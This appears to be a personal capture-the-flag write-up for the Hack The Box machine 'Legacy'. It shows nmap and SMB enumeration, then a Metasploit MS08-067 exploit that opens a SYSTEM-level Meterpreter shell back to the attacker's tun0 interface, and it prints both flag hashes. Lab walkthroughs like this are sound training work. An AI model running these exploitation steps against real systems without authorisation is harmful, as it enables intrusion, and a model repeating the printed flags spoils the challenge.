# Legacy 

## IP
> 
> 10.10.10.4
## nmap Scan
```
nmap -T4 -A 10.10.10.4 -Pn
```

![[Pasted image 20210728033315.png]]

## System Info 
>
 OS: Windows XP (Windows 2000 LAN Manager)
 Computer name: legacy


## Open Ports
       
>
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds

Both SMB 

## smbclient
```
smbclient -L ///10.10.10.4//
```

> Did not work

After Work Notes, my command was incorrect therefore I got no input, the correct command was:

```
smbclient -L \\\\10.10.10.4\\
```

## Metasploit 

### Search for SMB version 
```
msfconsole
search smb
use auxiliary/scanner/smb/smb_version
set rhost 10.10.10.4
run
```

>
No SMB version detected
Found that Machine is running Windows XP SP3 (language:English)


![[Pasted image 20210728034248.png]]

After searching online for exploits in this version I found this [rapid7 link](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)

We can use Metasploit to gain a shell inside the machine 

### Gaining Access to the machine 
```
msfconsole
use exploit/windows/smb/ms08_067_netapi
set rhost 10.10.10.4
set lhost tun0
run
```

Now we have access to the machine

#### Finding more information
```getuid```
>
Server username: NT AUTHORITY\SYSTEM

We are root

```sysinfo```
>
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

Our Meterpreter and the Architecture of the machine are the same x86, that is good.

Lets open cmd 

```shell```

#### Finding the Flag

```
cd c:\
cd Documents and Settings
cd john
cd Desktop
type user.txt
```

And like that we got the Flag!

>e69af0e4f443de7e36876fda4ec7644f

If we want to find the root flag (no points)

```
cd c:\
cd Documents and Settings
cd Administrator
cd Desktop
type root.txt
```

>	
993442d258b0e0ec917cae9e695d5713
